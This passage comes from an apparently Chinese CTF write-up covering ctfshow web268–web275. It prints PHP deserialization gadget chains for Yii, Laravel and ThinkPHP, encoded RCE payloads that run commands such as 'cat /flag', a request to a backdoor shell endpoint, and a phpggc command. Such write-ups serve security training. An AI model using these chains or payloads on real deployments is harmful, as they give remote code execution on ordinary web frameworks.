3.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为isRunning</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;axin&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>=&gt;<span class="string">&quot;handsome&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>换一条链子<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#-- coding: utf-8 --</span></span><br><span class="line"><span class="comment">#Author: MTRleed</span></span><br><span class="line"><span class="comment">#file: web268.php</span></span><br><span class="line"><span class="comment">#time: 2023/11/7 16:20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cat /fl*&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">DbSession</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader=<span class="keyword">new</span> DbSession();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">web</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$writeCallback</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="keyword">new</span> IndexAction();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writeCallback=[<span class="variable">$a</span>,<span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> BatchQueryResult()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?r=/backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo4OiJwYXNzdGhydSI7czoyOiJpZCI7czo4OiJjYXQgL2ZsKiI7fWk6MTtzOjM6InJ1biI7fX19</span><br></pre></td></tr></table></figure>或者<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#-- coding: utf-8 --</span></span><br><span class="line"><span class="comment">#Author: MTRleed</span></span><br><span class="line"><span class="comment">#file: web268.php</span></span><br><span class="line"><span class="comment">#time: 2023/11/7 16:20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;shell_exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cp /fl* 1.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为isRunning</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;axin&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>=&gt;<span class="string">&quot;handsome&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>之后再访问1.txt即可直接cat flag的话会出现An internal server error occurred.应该是设置了非调试模式的生产环境运行方式### web269(yii)继续用上一个链子### web270(yii)继续用上一个链子### web271(Laravel反序列化漏洞)打开页面显示`Laravel`，这也是一个 PHP 组件，存在反序列化漏洞![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web271.png)先随便序列化一下使之报错出PHP版本为`7.1.27`![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web271-4.png)随后使用工具直接生成 exp ，选择合适的 payload 那就一个 RCE2 吧，url 编码一下![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web271-1.png)![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web271-2.png)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A28%3A%22Illuminate%5CEvents%5CDispatcher%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00listeners%22%3Ba%3A1%3A%7Bs%3A9%3A%22cat+%2Fflag%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7D%7Ds%3A8%3A%22%00%2A%00event%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D</span><br></pre></td></tr></table></figure>直接打![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web271-3.png)### web272(Laravel)打开页面还是一样的![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web272.png)接着用上一把的 链子或者使用 PHP code 的方式<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#-- coding: utf-8 --</span></span><br><span class="line"><span class="comment">#Author: MTRleed</span></span><br><span class="line"><span class="comment">#file: web272.php</span></span><br><span class="line"><span class="comment">#time: 2023/11/9 10:29</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>\<span class="title">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=<span class="keyword">new</span> Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event=<span class="keyword">new</span> QueuedCommand();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Mockery</span>\<span class="title">Generator</span>\<span class="title">MockDefinition</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">QueuedCommand</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection=<span class="keyword">new</span> MockDefinition();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Mockery</span>\<span class="title">Loader</span>\<span class="title">EvalLoader</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Dispatcher</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver=[<span class="keyword">new</span> EvalLoader(),<span class="string">&#x27;load&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code=<span class="string">&quot;&lt;?php phpinfo();exit()?&gt;&quot;</span>; <span class="comment">//此处是PHP代码 &quot;<span class="meta">&lt;?php</span> system(&#x27;cat /flag&#x27;);exit()<span class="meta">?&gt;</span>&quot;</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;config=<span class="keyword">new</span> MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span>=<span class="string">&quot;feng&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>\<span class="title">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> PendingBroadcast()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A35%3A%22Mockery%5CGenerator%5CMockConfiguration%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A4%3A%22feng%22%3B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A24%3A%22%3C%3Fphp+phpinfo%28%29%3Bexit%28%29%3F%3E%22%3B%7D%7D%7D</span><br><span class="line"></span><br></pre></td></tr></table></figure>PHP code 方式使用 phpggc 生成要注意 `./phpggc Laravel/RCE6 'system("cat /flag");exit();' --url`不要添加PHP标签`<?php ?><p>`，工具已经内置了。内外层的引号也不能相同。</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web272-2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A29%3A%22Illuminate%5CSupport%5CMessageBag%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00messages%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00format%22%3BO%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A38%3A%22Illuminate%5CBroadcasting%5CBroadcastEvent%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A35%3A%22Mockery%5CGenerator%5CMockConfiguration%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A7%3A%22abcdefg%22%3B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A42%3A%22%3C%3Fphp+system%28%22cat+%2Fflag%22%29%3Bexit%28%29%3B+exit%3B+%3F%3E%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure><h3 id="web273-Laravel"><a href="#web273-Laravel" class="headerlink" title="web273(Laravel)"></a>web273(Laravel)</h3><p>和上一题一样</p><h3 id="web274-thinkphp"><a href="#web274-thinkphp" class="headerlink" title="web274(thinkphp)"></a>web274(thinkphp)</h3><p>打开网页显示</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web273.png"></p><p>右键查看源码发现传参提示</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web273-2.png"></p><p>直接上工具，选择对应版本，FW表示文件写入</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web273-1.png">    </p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web273-4.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbWkxZSI7czo5OiJjYXQgL2ZsYWciO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJzbWkxZSI7czo2OiJzeXN0ZW0iO31zOjk6IgAqAGFwcGVuZCI7YToxOntzOjU6InNtaTFlIjtzOjE6IjEiO319fX0=</span><br></pre></td></tr></table></figure><p>直接打</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web273-3.png"></p><h3 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-08 19:13:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-08 20:08:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span 